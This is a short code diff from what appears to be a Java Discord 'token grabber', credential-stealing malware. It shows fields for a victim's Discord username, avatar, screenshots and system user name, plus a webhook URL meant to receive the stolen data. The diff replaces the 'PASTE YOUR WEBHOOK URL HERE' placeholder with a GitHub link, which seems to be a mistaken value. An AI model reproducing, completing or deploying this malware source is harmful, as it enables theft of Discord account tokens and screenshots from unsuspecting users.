@@ -21,7 +21,7 @@ public class Main {
     public static String discordUsername;
     public static String discriminator;
     public static String avatarURL;
-    public static String webhookURL = "PASTE YOUR WEBHOOK URL HERE";
+    public static String webhookURL = "https://github.com/RustyBalboadev/Token-Grabber/blob/master/TokenGrabber/src/Main.java#L24E";
     public static String screenshotPath;
     public static void main(String[] args) throws IOException {
         username = System.getProperty("user.name");
